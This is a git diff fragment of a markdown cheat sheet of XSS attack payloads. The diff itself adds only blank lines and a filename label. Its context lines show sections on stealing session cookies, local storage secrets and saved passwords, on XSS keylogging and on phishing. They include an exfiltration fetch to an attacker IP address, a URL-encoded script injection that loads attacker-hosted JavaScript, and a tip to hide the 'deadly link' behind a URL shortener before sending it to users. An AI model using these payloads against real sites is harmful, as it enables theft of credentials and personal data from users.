@@ -24,6 +24,7 @@ XSS Payloads for fun and profit. Different types of XSS:
 ### Stealing session cookies
 
 Leverage XSS to fetch the payload from a web server you control:
+
 `xss.js`
 
 ```javascript
@@ -39,6 +40,7 @@ This payload may not work if `HttpOnly` is specified in the server headers.
 ### Stealing local secrets
 
 Local storage may include secrets like API keys or personal user info. There are two types: `sessionStorage` and `localStorage` - session storage only holds data for the session, whereas `localStorage` is the local cache and won't be flushed until explicitly done so.
+
 `local.js`
 
 ```javascript
@@ -52,6 +54,7 @@ fetch("http://192.168.49.51/exfil?data=" + encodedData)
 ### Keylogging
 
 It's keylogging, but through XSS. Let's see what users are typing:
+
 `klog.js`
 
 ```javascript
@@ -63,6 +66,7 @@ document.addEventListener('keydown', logKey);
 ```
 
 ### Stealing saved passwords
+
 `stealer.js`
 
 ```javascript
@@ -90,6 +94,7 @@ let body = document.getElementsByTagName("body")[0]
 
 The concept is simple: Use javascript to *fetch* the login page, and change the action (submit) on the form to point to our listening server hosting the XSS. Take the above **Reflected Server XSS** for example. In the `search.php?s=` parameter, we could use `<script src="10.10.13.37/xss.js"></script>`, but URLEncode it first: `search.php?s=%3Cscript%20src%3D%2210%2E10%2E13%2E37%2Fxss%2Ejs%22%3E%3C%2Fscript%3E`. Now we have a deadly link to send to users, or take it a step further and use a URL shortener 😉
 
+`phish.js`
 
 ```javascript
 fetch("login").then(res => res.text().then(data => {
